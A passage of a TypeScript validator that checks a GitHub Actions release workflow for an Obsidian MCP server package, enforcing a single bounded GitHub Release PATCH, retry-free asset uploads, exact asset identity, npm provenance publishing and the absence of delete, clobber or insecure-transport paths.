    uploadPostTagIndex <= uploadRecoveryEndIndex ||
    uploadIdentityIndex <= uploadPostTagIndex
  ) {
    problems.push("each missing release asset must use one retry-free POST and exact no-replay reconciliation");
  }

  const projection = "[.[] | {id, name, state, content_type, size, digest}] | sort_by(.name)";
  const publishReserve = 'require_job_reserve 2400 "GitHub Release publication"';
  const finalAssetIdentitySource = `FINAL_ASSET_IDENTITY=$(printf '%s' "$FINAL_ASSETS" | jq -cS`;
  const publishReleaseSource = "PUBLISH_RELEASE=$CURRENT_RELEASE";
  const publishAssetsSource = "PUBLISH_ASSETS=$CURRENT_ASSETS";
  const publishStateSource = `PUBLISH_STATE=$(jq -n --argjson release "$PUBLISH_RELEASE" --argjson assets "$PUBLISH_ASSETS"`;
  const publishActionSource = `FINAL_ACTION=$(printf '%s' "$PUBLISH_STATE" | release_state | jq -r '.action')`;
  const publishAssetIdentitySource = `PUBLISH_ASSET_IDENTITY=$(printf '%s' "$PUBLISH_ASSETS" | jq -cS`;
  const immediatePublishStateReleaseSource = `IMMEDIATE_PUBLISH_STATE=$(jq -n --argjson release "$CURRENT_RELEASE"`;
  const immediatePublishStateAssetsSource = `--argjson assets "$CURRENT_ASSETS" '{release: $release, assets: $assets}')`;
  const immediatePublishActionSource = `FINAL_ACTION=$(printf '%s' "$IMMEDIATE_PUBLISH_STATE" | release_state | jq -r '.action')`;
  const immediateAssetIdentitySource = `IMMEDIATE_ASSET_IDENTITY=$(printf '%s' "$CURRENT_ASSETS" | jq -cS`;
  const confirmPublishStateReleaseSource = `CONFIRM_PUBLISH_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE"`;
  const confirmPublishStateAssetsSource = `--argjson assets "$CONFIRM_ASSETS" '{release: $release, assets: $assets}')`;
  const confirmPublishActionSource = `CONFIRM_PUBLISH_ACTION=$(printf '%s' "$CONFIRM_PUBLISH_STATE" | release_state | jq -r '.action')`;
  const confirmAssetIdentitySource = `CONFIRM_ASSET_IDENTITY=$(printf '%s' "$CONFIRM_ASSETS" | jq -cS`;
  const publishAssetIdentityGuard = '[ "$PUBLISH_ASSET_IDENTITY" != "$FINAL_ASSET_IDENTITY" ]';
  const immediateAssetIdentityGuard = '[ "$IMMEDIATE_ASSET_IDENTITY" != "$FINAL_ASSET_IDENTITY" ]';
  const publishConfirmActionGuard = 'if [ "$CONFIRM_PUBLISH_ACTION" != "publish_draft" ] ||';
  const publishConfirmIdentityGuard = '[ "$CONFIRM_ASSET_IDENTITY" != "$FINAL_ASSET_IDENTITY" ]; then';
  const publishDraftGate = 'if [ "$FINAL_ACTION" = "publish_draft" ]; then';
  const finalLocalProjectionSource = `FINAL_LOCAL_PROJECTION=$(printf '%s' "$FINAL_ASSETS" | jq -cS`;
  const finalDirectorySource = 'FINAL_DIR=".mcpb-release-final-$GITHUB_RUN_ID"';
  const publishFieldsSource = 'PUBLISH_FIELDS=(-F draft=false -F "prerelease=$EXPECTED_PRERELEASE")';
  const publishDraftConfirmationSource =
    'if ! confirm_exact_draft_identity "Immediate pre-publication draft confirmation"; then';
  const stableChannelComment = "# The stable-channel guard is deliberately after reserve, tag";
  const finalLocalProjectionBlock = normalizedIndentedBlock(upload, finalLocalProjectionSource, finalDirectorySource);
  const publicationAuthorizationBlock = normalizedIndentedBlock(upload, publishReleaseSource, publishFieldsSource);
  const immediatePublicationAuthorizationBlock = normalizedIndentedBlock(
    upload,
    immediatePublishStateReleaseSource,
    publishDraftConfirmationSource
  );
  const confirmPublicationAuthorizationBlock = normalizedIndentedBlock(
    upload,
    publishDraftConfirmationSource,
    stableChannelComment
  );
  const hasExactFinalLocalProjectionBlock =
    sha256(finalLocalProjectionBlock) === "19fd4a2754537c71e163f0bb04c209608ed3030871de2e8c54ef9e5108585577";
  const hasExactPublicationAuthorizationBlock =
    sha256(publicationAuthorizationBlock) === "76e4fcdf0beed45cb489560f1f904a1f76ed23c39cde0da07c03d4afa1d5f674";
  const hasExactImmediatePublicationAuthorizationBlock =
    sha256(immediatePublicationAuthorizationBlock) ===
    "8b4d3468625685260be550e095dc83c684288487cd6f9447236631d87c71ed3a";
  const hasExactConfirmPublicationAuthorizationBlock =
    sha256(confirmPublicationAuthorizationBlock) === "0ac17f80d5e5a9e6933c4b68d4aa5dc90fddc73ee377115745bad5cc42f982da";
  const publishFieldsBlock =
    'PUBLISH_FIELDS=(-F draft=false -F "prerelease=$EXPECTED_PRERELEASE")\n' +
    `  if [ "\${{ steps.dist_tag.outputs.tag }}" = "latest" ]; then\n` +
    "    PUBLISH_FIELDS+=(-f make_latest=true)\n" +
    "  else\n" +
    "    PUBLISH_FIELDS+=(-f make_latest=false)\n" +
    "  fi";
  const finalIdentitySourceIndex = upload.indexOf(finalAssetIdentitySource);
  const publishReleaseSourceIndex = upload.indexOf(publishReleaseSource, finalIdentitySourceIndex);
  const publishAssetsSourceIndex = upload.indexOf(publishAssetsSource, publishReleaseSourceIndex);
  const publishStateSourceIndex = upload.indexOf(publishStateSource, publishAssetsSourceIndex);
  const publishActionSourceIndex = upload.indexOf(publishActionSource, publishStateSourceIndex);
  const publishIdentitySourceIndex = upload.indexOf(publishAssetIdentitySource, publishActionSourceIndex);
  const publishIdentityGuardIndex = upload.indexOf(publishAssetIdentityGuard, publishIdentitySourceIndex);
  const outerPublishDraftGateIndex = upload.indexOf(publishDraftGate, publishIdentityGuardIndex);
  const publishReserveIndex = upload.indexOf(publishReserve, outerPublishDraftGateIndex);
  const publishTagIndex = upload.indexOf("assert_remote_tag_identity", publishReserveIndex);
  const publishRefreshIndex = upload.indexOf("Immediate pre-publication reconciliation", publishTagIndex);
  const immediatePublishStateReleaseSourceIndex = upload.indexOf(
    immediatePublishStateReleaseSource,
    publishRefreshIndex
  );
  const immediatePublishStateAssetsSourceIndex = upload.indexOf(
    immediatePublishStateAssetsSource,
    immediatePublishStateReleaseSourceIndex
  );
  const immediatePublishActionSourceIndex = upload.indexOf(
    immediatePublishActionSource,
    immediatePublishStateAssetsSourceIndex
  );
  const immediateIdentitySourceIndex = upload.indexOf(immediateAssetIdentitySource, immediatePublishActionSourceIndex);
  const immediateIdentityGuardIndex = upload.indexOf(immediateAssetIdentityGuard, immediateIdentitySourceIndex);
  const innerPublishDraftGateIndex = upload.indexOf(publishDraftGate, immediateIdentityGuardIndex);
  const publishDraftConfirmIndex = upload.indexOf(
    "Immediate pre-publication draft confirmation",
    innerPublishDraftGateIndex
  );
  const publishConfirmStateIndex = upload.indexOf(confirmPublishStateReleaseSource, publishDraftConfirmIndex);
  const publishConfirmStateAssetsSourceIndex = upload.indexOf(
    confirmPublishStateAssetsSource,
    publishConfirmStateIndex
  );
  const publishConfirmActionSourceIndex = upload.indexOf(
    confirmPublishActionSource,
    publishConfirmStateAssetsSourceIndex
  );
  const publishConfirmIdentitySourceIndex = upload.indexOf(confirmAssetIdentitySource, publishConfirmActionSourceIndex);
  const publishConfirmActionGuardIndex = upload.indexOf(publishConfirmActionGuard, publishConfirmIdentitySourceIndex);
  const publishConfirmIdentityGuardIndex = upload.indexOf(publishConfirmIdentityGuard, publishConfirmActionGuardIndex);
  const publishConfirmErrorIndex = upload.indexOf(
    "Final pre-publication snapshot changed before the publication boundary",
    publishConfirmIdentityGuardIndex
  );
  const latestPrewriteIndex = upload.indexOf("if github_latest_read; then", publishConfirmErrorIndex);
  const latestAdvanceIndex = upload.indexOf(
    `"$VERSION" "$CURRENT_LATEST_VERSION" "\${{ steps.dist_tag.outputs.tag }}"`,
    latestPrewriteIndex
  );
  const patchPrefix = 'PUBLISHED_RELEASE=$("$TIMEOUT_BIN" --kill-after=10s 120s "$GH_BIN" api --method PATCH \\';
  const patchTarget = `"repos/\${{ github.repository }}/releases/$RELEASE_ID" "\${PUBLISH_FIELDS[@]}")`;
  const patchIndex = upload.indexOf(patchPrefix, latestAdvanceIndex);
  const patchTargetIndex = upload.indexOf(patchTarget, patchIndex);
  const publishRecoveryIndex = upload.indexOf("for (( publish_attempt=1; publish_attempt<=12;", patchIndex);
  const postProjectionIndex = upload.indexOf("POST_ASSET_IDENTITY", publishRecoveryIndex);
  const latestLoopIndex = upload.indexOf("for (( latest_attempt=1; latest_attempt<=12;", postProjectionIndex);
  const latestConvergenceIndex = upload.indexOf(
    '[ "$LATEST_TAG" = "$TAG" ] && [ "$LATEST_ID" = "$RELEASE_ID" ]',
    latestLoopIndex
  );
  const latestFailureIndex = upload.indexOf("did not become GitHub's latest release", latestConvergenceIndex);
  const finalTagIndex = upload.indexOf("assert_remote_tag_identity", latestFailureIndex);
  const immediateReuseIndex = upload.indexOf('elif [ "$FINAL_ACTION" = "reuse_published" ]; then', patchTargetIndex);
  const immediateReuseTagIndex = upload.indexOf("assert_remote_tag_identity", immediateReuseIndex);
  const outerReuseIndex = upload.indexOf('elif [ "$FINAL_ACTION" = "reuse_published" ]; then', immediateReuseTagIndex);
  const outerReuseTagIndex = upload.indexOf("assert_remote_tag_identity", outerReuseIndex);
  if (
    mutationMatchCount(upload, "--method PATCH") !== 1 ||
    mutationMatchCount(upload, patchPrefix) !== 1 ||
    mutationMatchCount(upload, patchTarget) !== 1 ||
    mutationMatchCount(upload, publishFieldsBlock) !== 1 ||
    mutationMatchCount(upload, "PUBLISH_FIELDS=(") !== 1 ||
    mutationMatchCount(upload, "PUBLISH_FIELDS+=(") !== 2 ||
    mutationMatchCount(upload, "PUBLISH_FIELDS+=(-f make_latest=true)") !== 1 ||
    mutationMatchCount(upload, "PUBLISH_FIELDS+=(-f make_latest=false)") !== 1 ||
    mutationMatchCount(upload, finalAssetIdentitySource) !== 1 ||
    mutationMatchCount(upload, publishReleaseSource) !== 1 ||
    mutationMatchCount(upload, publishAssetsSource) !== 1 ||
    mutationMatchCount(upload, publishStateSource) !== 1 ||
    mutationMatchCount(upload, publishActionSource) !== 1 ||
    mutationMatchCount(upload, publishAssetIdentitySource) !== 1 ||
    mutationMatchCount(upload, immediatePublishStateReleaseSource) !== 1 ||
    mutationMatchCount(upload, immediatePublishStateAssetsSource) !== 1 ||
    mutationMatchCount(upload, immediatePublishActionSource) !== 1 ||
    mutationMatchCount(upload, immediateAssetIdentitySource) !== 1 ||
    mutationMatchCount(upload, confirmPublishStateReleaseSource) !== 1 ||
    mutationMatchCount(upload, confirmPublishStateAssetsSource) !== 1 ||
    mutationMatchCount(upload, confirmPublishActionSource) !== 1 ||
    mutationMatchCount(upload, confirmAssetIdentitySource) !== 1 ||
    mutationMatchCount(upload, publishAssetIdentityGuard) !== 1 ||
    mutationMatchCount(upload, immediateAssetIdentityGuard) !== 1 ||
    mutationMatchCount(upload, publishConfirmActionGuard) !== 1 ||
    mutationMatchCount(upload, publishConfirmIdentityGuard) !== 1 ||
    mutationMatchCount(upload, publishDraftGate) !== 2 ||
    !hasExactPublicationAuthorizationBlock ||
    !hasExactImmediatePublicationAuthorizationBlock ||
    !hasExactConfirmPublicationAuthorizationBlock ||
    assignmentLineCount(upload, "FINAL_ASSET_IDENTITY") !== 1 ||
    assignmentLineCount(upload, "PUBLISH_RELEASE") !== 1 ||
    assignmentLineCount(upload, "PUBLISH_ASSETS") !== 1 ||
    assignmentLineCount(upload, "PUBLISH_STATE") !== 1 ||
    assignmentLineCount(upload, "FINAL_ACTION") !== 3 ||
    assignmentLineCount(upload, "PUBLISH_ASSET_IDENTITY") !== 1 ||
    assignmentLineCount(upload, "IMMEDIATE_PUBLISH_STATE") !== 1 ||
    assignmentLineCount(upload, "IMMEDIATE_ASSET_IDENTITY") !== 1 ||
    assignmentLineCount(upload, "CONFIRM_PUBLISH_STATE") !== 1 ||
    assignmentLineCount(upload, "CONFIRM_PUBLISH_ACTION") !== 1 ||
    assignmentLineCount(upload, "CONFIRM_ASSET_IDENTITY") !== 1 ||
    !upload.includes("PATCH_EXIT=$?") ||
    !upload.includes("without repeating PATCH") ||
    !upload.includes(
      `if ! EXACT_RELEASE=$(gh_read api "repos/\${{ github.repository }}/releases/$RELEASE_ID"); then`
    ) ||
    !upload.includes("for (( published_list_attempt=1; published_list_attempt<=12;") ||
    !upload.includes("for (( post_publish_asset_attempt=1; post_publish_asset_attempt<=12;") ||
    !upload.includes("IMMEDIATE_ASSET_IDENTITY") ||
    !upload.includes("Recovered an externally completed exact publication before repeating PATCH") ||
    !upload.includes('[ "$LATEST_TAG" = "$TAG" ] && [ "$LATEST_ID" = "$RELEASE_ID" ]') ||
    !upload.includes(`"$VERSION" "$CURRENT_LATEST_VERSION" "\${{ steps.dist_tag.outputs.tag }}"`) ||
    finalIdentitySourceIndex < 0 ||
    publishReleaseSourceIndex <= finalIdentitySourceIndex ||
    publishAssetsSourceIndex <= publishReleaseSourceIndex ||
    publishStateSourceIndex <= publishAssetsSourceIndex ||
    publishActionSourceIndex <= publishStateSourceIndex ||
    publishIdentitySourceIndex <= publishActionSourceIndex ||
    publishIdentityGuardIndex <= publishIdentitySourceIndex ||
    outerPublishDraftGateIndex <= publishIdentityGuardIndex ||
    publishReserveIndex <= outerPublishDraftGateIndex ||
    publishTagIndex <= publishReserveIndex ||
    publishRefreshIndex <= publishTagIndex ||
    immediatePublishStateReleaseSourceIndex <= publishRefreshIndex ||
    immediatePublishStateAssetsSourceIndex <= immediatePublishStateReleaseSourceIndex ||
    immediatePublishActionSourceIndex <= immediatePublishStateAssetsSourceIndex ||
    immediateIdentitySourceIndex <= immediatePublishActionSourceIndex ||
    immediateIdentityGuardIndex <= immediateIdentitySourceIndex ||
    innerPublishDraftGateIndex <= immediateIdentityGuardIndex ||
    innerPublishDraftGateIndex <= outerPublishDraftGateIndex ||
    publishDraftConfirmIndex <= innerPublishDraftGateIndex ||
    publishConfirmStateIndex <= publishDraftConfirmIndex ||
    publishConfirmStateAssetsSourceIndex <= publishConfirmStateIndex ||
    publishConfirmActionSourceIndex <= publishConfirmStateAssetsSourceIndex ||
    publishConfirmIdentitySourceIndex <= publishConfirmActionSourceIndex ||
    publishConfirmActionGuardIndex <= publishConfirmIdentitySourceIndex ||
    publishConfirmIdentityGuardIndex <= publishConfirmActionGuardIndex ||
    upload
      .slice(publishConfirmActionGuardIndex + publishConfirmActionGuard.length, publishConfirmIdentityGuardIndex)
      .trim() !== "\\" ||
    publishConfirmErrorIndex <= publishConfirmIdentityGuardIndex ||
    latestPrewriteIndex <= publishConfirmErrorIndex ||
    latestAdvanceIndex <= latestPrewriteIndex ||
    patchIndex <= latestAdvanceIndex ||
    patchTargetIndex <= patchIndex ||
    upload.slice(patchIndex + patchPrefix.length, patchTargetIndex).trim().length !== 0 ||
    immediateReuseIndex <= patchTargetIndex ||
    immediateReuseTagIndex <= immediateReuseIndex ||
    outerReuseIndex <= immediateReuseTagIndex ||
    outerReuseTagIndex <= outerReuseIndex ||
    outerReuseTagIndex >= publishRecoveryIndex ||
    publishRecoveryIndex <= patchIndex ||
    postProjectionIndex <= publishRecoveryIndex ||
    latestLoopIndex <= postProjectionIndex ||
    latestConvergenceIndex <= latestLoopIndex ||
    latestFailureIndex <= latestConvergenceIndex ||
    finalTagIndex <= latestFailureIndex
  ) {
    problems.push("release publication must be one bounded PATCH followed by exact-ID convergence without replay");
  }
  if (
    mutationMatchCount(upload, releaseStatePayload) !== 12 ||
    mutationMatchCount(upload, metadataProjection) !== 3 ||
    !hasExactPrewriteAuthorizationBlock ||
    !hasExactConfirmAuthorizationBlock ||
    !hasExactFinalLocalProjectionBlock ||
    !hasExactPublicationAuthorizationBlock ||
    !hasExactImmediatePublicationAuthorizationBlock ||
    !hasExactConfirmPublicationAuthorizationBlock
  ) {
    problems.push("release authorization snapshots must preserve their exact state and metadata projections");
  }
  if (
    mutationMatchCount(upload, projection) !== 5 ||
    mutationMatchCount(upload, "node scripts/check-release-integrity.mjs visibility") !== 2 ||
    !upload.includes('[ "$PUBLISH_ASSET_IDENTITY" != "$FINAL_ASSET_IDENTITY" ]') ||
    !upload.includes('[ "$POST_ASSET_IDENTITY" != "$FINAL_ASSET_IDENTITY" ]') ||
    !upload.includes("download_exact_release_asset()") ||
    !upload.includes('cmp -s "$local_asset" "$attempt_asset"') ||
    !upload.includes('[ "$FINAL_LOCAL_PROJECTION" != "$LOCAL_ASSET_PROJECTION" ]')
  ) {
    problems.push("the exact six-asset identity and bytes must remain frozen across publication");
  }
  const allRunBodies = steps.map(runBody).concat(upload).join("\n");
  const explicitWriteMethods =
    allRunBodies.match(/(?:(?:--method|--request)(?:=|\s+)|-X\s*)(?:POST|PATCH|PUT|DELETE)\b/giu) ?? [];
  const ghApiSurfaceLines = allRunBodies
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => /\bgh\s+api\b|"?\$GH_BIN"?\s+api\b/u.test(line));
  const allowedGhApiMessages = new Set([
    'echo "::error::gh_read accepts read-only gh api calls" >&2',
    'echo "::error::gh_read rejects mutation-capable gh api arguments" >&2'
  ]);
  const directGhApiLines = ghApiSurfaceLines.filter((line) => !allowedGhApiMessages.has(line));
  const hasForbiddenReleaseCli = /(?:"?\$(?:GH_BIN|\{GH_BIN\})"?|\bgh)\s+release\s+(?:delete|edit|upload)\b/iu.test(
    allRunBodies
  );
  if (
    explicitWriteMethods.length !== 2 ||
    mutationMatchCount(allRunBodies, "--request POST") !== 1 ||
    mutationMatchCount(allRunBodies, "--method PATCH") !== 1 ||
    mutationMatchCount(allRunBodies, '"$GH_BIN" api --method PATCH') !== 1 ||
    ghApiSurfaceLines.length !== 15 ||
    directGhApiLines.length !== 1 ||
    !directGhApiLines[0]?.startsWith(
      'PUBLISHED_RELEASE=$("$TIMEOUT_BIN" --kill-after=10s 120s "$GH_BIN" api --method PATCH'
    ) ||
    mutationMatchCount(allRunBodies, 'release create "$TAG"') !== 1 ||
    /(?:--method|-X|--request)(?:=|\s+)(?:DELETE|PUT)\b/iu.test(allRunBodies) ||
    hasForbiddenReleaseCli ||
    allRunBodies.includes("delete-asset") ||
    allRunBodies.includes("--clobber") ||
    /(?:^|\s)(?:--insecure|-k|--resolve|--connect-to|--unix-socket|--abstract-unix-socket)(?:\s|=|$)/mu.test(
      uploadCurlBody
    ) ||
    mutationMatchCount(uploadCurlBody, '--data-binary "@$LOCAL_ASSET"') !== 1 ||
    (uploadCurlBody.match(/https?:\/\//gu) ?? []).length !== 0 ||
    mutationMatchCount(uploadCurlBody, uploadTarget) !== 1 ||
    /--retry\s+[1-9]/u.test(upload)
  ) {
    problems.push("GitHub Release recovery must expose no delete, clobber, or transport-replay path");
  }
  return problems;
}

const BASIC_MCPB_TOOLS = [
  "obsidian_frontmatter_get",
  "obsidian_frontmatter_search",
  "obsidian_get_backlinks",
  "obsidian_get_outbound_links",
  "obsidian_get_recent_edits",
  "obsidian_list_notes",
  "obsidian_list_tags",
  "obsidian_read_note",
  "obsidian_resolve_wikilink",
  "obsidian_search",
  "obsidian_search_text",
  "obsidian_stale_notes",
  "obsidian_stats"
].sort();

const MCPB_HYBRID_POSITIVE_ASSERTION =
  'expected: /"signals_used":\\s*\\[\\s*"tfidf"\\s*\\][\\s\\S]*"path":\\s*"Projects\\/Hermes\\.md"/';
const MCPB_HYBRID_ABSENT_QUERY = 'arguments: { query: "MCPB-definitely-absent-search-sentinel", limit: 5 }';
const MCPB_HYBRID_NEGATIVE_ASSERTION =
  'assert.match(noMatchText, /"matches":\\s*\\[\\s*\\]/, "obsidian_search: absent-token query returned matches")';
const MCPB_HYBRID_FALSE_HIT_ASSERTION =
  '!noMatchText.includes("Projects/Hermes.md"), "obsidian_search: negative control leaked a false hit"';
const MCPB_NPM_CHANNEL_ADVANCE =
  "            node scripts/check-release-integrity.mjs channel-advance \\\n" +
  '              "$VERSION" "$PRE_WRITE_CHANNEL_VERSION" "$CHANNEL"\n' +
  '            PRE_PUBLISH_INTEGRITY=$(tarball_sri "$PACKAGE_TARBALL")';
const MCPB_EXACT_NPM_PACK = '"$TIMEOUT_BIN" --kill-after=10s 600s "$NPM_BIN" pack --json --ignore-scripts';
const MCPB_EXACT_NPM_PUBLISH =
  `              /usr/bin/env "\${NPM_ENV_UNSETS[@]}" \\\n` +
  "                NPM_CONFIG_REGISTRY=https://registry.npmjs.org/ \\\n" +
  "                NPM_CONFIG_PROXY= NPM_CONFIG_HTTPS_PROXY= NPM_CONFIG_CA= NPM_CONFIG_CAFILE= \\\n" +
  "                NPM_CONFIG_STRICT_SSL=true NPM_CONFIG_FETCH_RETRIES=0 NPM_CONFIG_FETCH_TIMEOUT=60000 \\\n" +
  '                NPM_CONFIG_USERCONFIG="$NPM_CONFIG_USERCONFIG" NPM_CONFIG_GLOBALCONFIG=/dev/null \\\n' +
  '                "$TIMEOUT_BIN" --kill-after=10s 600s "$NPM_BIN" publish "$PACKAGE_TARBALL" \\\n' +
  '                --userconfig="$NPM_CONFIG_USERCONFIG" --globalconfig=/dev/null \\\n' +
  "                --registry=https://registry.npmjs.org/ \\\n" +
  "                --@oomkapwn:registry=https://registry.npmjs.org/ \\\n" +
  "                --fetch-retries=0 --fetch-timeout=60000 --strict-ssl=true \\\n" +
  '                --provenance --access public --tag "$CHANNEL" --ignore-scripts';
const MCPB_EXACT_NPM_PUBLISH_RUN =
  `    /usr/bin/env "\${NPM_ENV_UNSETS[@]}" \\\n` +
  "      NPM_CONFIG_REGISTRY=https://registry.npmjs.org/ \\\n" +
  "      NPM_CONFIG_PROXY= NPM_CONFIG_HTTPS_PROXY= NPM_CONFIG_CA= NPM_CONFIG_CAFILE= \\\n" +
  "      NPM_CONFIG_STRICT_SSL=true NPM_CONFIG_FETCH_RETRIES=0 NPM_CONFIG_FETCH_TIMEOUT=60000 \\\n" +
  '      NPM_CONFIG_USERCONFIG="$NPM_CONFIG_USERCONFIG" NPM_CONFIG_GLOBALCONFIG=/dev/null \\\n' +
  '      "$TIMEOUT_BIN" --kill-after=10s 600s "$NPM_BIN" publish "$PACKAGE_TARBALL" \\\n' +
  '      --userconfig="$NPM_CONFIG_USERCONFIG" --globalconfig=/dev/null \\\n' +
  "      --registry=https://registry.npmjs.org/ \\\n" +
  "      --@oomkapwn:registry=https://registry.npmjs.org/ \\\n" +
  "      --fetch-retries=0 --fetch-timeout=60000 --strict-ssl=true \\\n" +
  '      --provenance --access public --tag "$CHANNEL" --ignore-scripts';
const MCPB_EXACT_NPM_PUBLISH_HEAD = '"$TIMEOUT_BIN" --kill-after=10s 600s "$NPM_BIN" publish "$PACKAGE_TARBALL" \\';
const MCPB_NPM_TARBALL_SRI =
  'process.stdout.write(`sha512-${createHash("sha512").update(readFileSync(process.argv[1]))' + '.digest("base64")}`);';
const MCPB_ACTIONS_ARTIFACT_DOWNLOAD =
  '          gh_read api -H "Accept: application/vnd.github+json" \\\n' +
  `            "repos/\${{ github.repository }}/actions/artifacts/$PINNED_ARTIFACT_ID/zip" > "$CANDIDATE_ZIP"`;
const MCPB_RELEASE_VISIBILITY_POLL =
  "          for (( release_attempt=1; release_attempt<=12; release_attempt++ )); do";
const MCPB_RELEASE_VISIBILITY_REFRESH = "            if ! RELEASE_PAGES=$(gh_read api --paginate --slurp";
const MCPB_RELEASE_VISIBILITY_POLL_WITH_REFRESH = `${MCPB_RELEASE_VISIBILITY_POLL}\n${MCPB_RELEASE_VISIBILITY_REFRESH}`;
const MCPB_RELEASE_VISIBILITY_DUPLICATE_GUARD =
  '            if [ "$RELEASE_COUNT" -gt 1 ]; then\n' +
  '              echo "::error::Asset phase found duplicate draft/published releases for $TAG"\n' +
  "              exit 1\n" +
  "            fi";
const MCPB_RELEASE_VISIBILITY_TIMEOUT_GUARD =
  '            if [ "$release_attempt" -eq 12 ]; then\n' +
  '              echo "::error::Release $TAG did not become visible after 12 bounded checks"\n' +
  "              exit 1\n" +
  "            fi";
const MCPB_RELEASE_VISIBILITY_WAIT =
  '            echo "::warning::Release $TAG is not visible yet (attempt $release_attempt/12); retrying in 5s"\n' +
  "            sleep 5";
const MCPB_PREFLIGHT_ASSET_COMPARE =
  '            if ! cmp -s "$LOCAL_ASSET" "$PREFLIGHT_DIR/$NAME"; then\n' +
  '              echo "::error::Existing release asset $NAME differs before npm publication"\n' +
  "              exit 1\n" +
  "            fi";
const NPM_PROVENANCE_CONTRACT_PROBLEM =
  "npm provenance must bind the tag-push context before the sole publish " +
  "and verify two exact attestations without credentials";
const MCP_REGISTRY_EVALUATOR_CONTRACT_PROBLEM =
  "MCP Registry reconciliation must retain exact identity, lifecycle, absence, and convergence semantics";
const MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM =
  "stable MCP Registry publication must bind exact source manifests, one pinned publisher write, and bounded readback";
const NPM_PROVENANCE_STEP_NAME = "Verify exact npm provenance without credentials";
const NPM_PROVENANCE_CONTEXT_COMMAND =
  '"$NODE_BIN" scripts/check-release-integrity.mjs npm-provenance-context "$SOURCE_SHA" "$TAG"';
const NPM_PROVENANCE_AUDIT_COMMAND = '"$TIMEOUT_BIN" --kill-after=10s 120s "$NODE_BIN" "$NPM_CLI_JS" audit signatures';
const NPM_PROVENANCE_EVALUATOR_COMMAND = '"$TIMEOUT_BIN" --kill-after=5s 30s "$NODE_BIN" "$CHECKER" \\';
const NPM_PROVENANCE_SUCCESS_CONDITION = '[ "$AUDIT_EXIT" -eq 0 ] && [ "$EVALUATOR_EXIT" -eq 0 ]';
const NPM_PROVENANCE_CLI_SRI =
  "sha512-T67M4L5wNm0cZ7EBLErcEkY1SmzEW/WJ+SADBzsFUY1UdAPfFHXFQtZ6SEXiK0+vzXysCvAsepbMaBTwnrAD+w==";

function npmProvenanceWorkflowProblems(release: string): string[] {
  let steps: YamlRecord[];
  try {
    const releaseDocument = yamlRecord(load(release));
    const releaseJob = yamlRecord(yamlRecord(releaseDocument?.jobs)?.publish);
    steps = yamlSteps(releaseJob ?? {});
  } catch {
    return [NPM_PROVENANCE_CONTRACT_PROBLEM];
  }
  const publishIndex = steps.findIndex(
    (step) => step.name === "Publish with provenance or verify an exact prior publication"
  );
  const verificationIndex = steps.findIndex((step) => step.name === NPM_PROVENANCE_STEP_NAME);
  const draftIndex = steps.findIndex((step) => step.name === "Prepare draft GitHub Release");
  const publishStep = publishIndex >= 0 ? steps[publishIndex] : undefined;
  const verificationStep = verificationIndex >= 0 ? steps[verificationIndex] : undefined;
  const publishRun = runBody(publishStep);
  const verificationRun = runBody(verificationStep);
  const publishEnv = yamlRecord(publishStep?.env);
  const verificationEnv = yamlRecord(verificationStep?.env);
  const contextBindings: Record<string, string> = {
    PROVENANCE_EVENT_NAME: `\${{ github.event_name }}`,
    PROVENANCE_REF: `\${{ github.ref }}`,
    PROVENANCE_REF_NAME: `\${{ github.ref_name }}`,
    PROVENANCE_REF_TYPE: `\${{ github.ref_type }}`,
    PROVENANCE_REPOSITORY: `\${{ github.repository }}`,
    PROVENANCE_REPOSITORY_ID: `\${{ github.repository_id }}`,
    PROVENANCE_REPOSITORY_OWNER_ID: `\${{ github.repository_owner_id }}`,
    PROVENANCE_RUN_ATTEMPT: `\${{ github.run_attempt }}`,
    PROVENANCE_RUN_ID: `\${{ github.run_id }}`,
    PROVENANCE_RUNNER_ENVIRONMENT: `\${{ runner.environment }}`,
    PROVENANCE_SERVER_URL: `\${{ github.server_url }}`,
    PROVENANCE_SHA: `\${{ github.sha }}`,
    PROVENANCE_WORKFLOW_REF: `\${{ github.workflow_ref }}`,
    PROVENANCE_WORKFLOW_SHA: `\${{ github.workflow_sha }}`
  };
  const verifierBindings: Record<string, string> = {
    RELEASE_JOB_DEADLINE_EPOCH: `\${{ steps.deadline.outputs.epoch }}`,
    EXPECTED_VERSION: `\${{ steps.npm_publication.outputs.version }}`,
    EXPECTED_SOURCE_SHA: `\${{ steps.npm_publication.outputs.source_sha }}`,
    EXPECTED_TAG: `\${{ steps.npm_publication.outputs.tag }}`,
    EXPECTED_INTEGRITY: `\${{ steps.npm_publication.outputs.integrity }}`,
    PUBLISH_ATTEMPTED: `\${{ steps.npm_publication.outputs.publish_attempted }}`,
    CURRENT_RUN_ID: `\${{ github.run_id }}`,
    CURRENT_RUN_ATTEMPT: `\${{ github.run_attempt }}`
  };

  const publishReserveIndex = publishRun.indexOf('require_job_reserve 4500 "npm publish"');
  const prewriteTagIndex = publishRun.indexOf("\n  assert_remote_tag_identity", publishReserveIndex);
  const prewriteReadIndex = publishRun.indexOf("if ! registry_read; then", prewriteTagIndex);
  const prewriteRehashIndex = publishRun.indexOf(
    'PRE_PUBLISH_INTEGRITY=$(tarball_sri "$PACKAGE_TARBALL")',
    prewriteReadIndex
  );
  const contextIndex = publishRun.indexOf(NPM_PROVENANCE_CONTEXT_COMMAND, prewriteRehashIndex);
  const attemptedIndex = publishRun.indexOf("NPM_PUBLISH_ATTEMPTED=true", contextIndex);
  const solePublishIndex = publishRun.indexOf(MCPB_EXACT_NPM_PUBLISH_RUN, attemptedIndex);
  const publishOutputIndex = publishRun.indexOf("printf 'publish_attempted=%s\\n'", solePublishIndex);

  const verifierReserveIndex = verificationRun.indexOf(
    'require_job_reserve 2700 "token-free npm provenance verification"'
  );
  const userConfigIndex = verificationRun.indexOf('NPM_USERCONFIG="$VERIFY_ROOT/user.npmrc"', verifierReserveIndex);
  const globalConfigIndex = verificationRun.indexOf('NPM_GLOBALCONFIG="$VERIFY_ROOT/global.npmrc"', userConfigIndex);
  const configTouchIndex = verificationRun.indexOf(
    '/usr/bin/touch "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"',
    globalConfigIndex
  );
  const configChmodIndex = verificationRun.indexOf(
    '/bin/chmod 600 "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"',
    configTouchIndex
  );
  const configGuardIndex = verificationRun.indexOf(
    "npm verifier config files are missing, aliased, or unsafe",
    configChmodIndex
  );
  const globalConfigBindingIndex = verificationRun.indexOf(
    '"NPM_CONFIG_GLOBALCONFIG=$NPM_GLOBALCONFIG"',
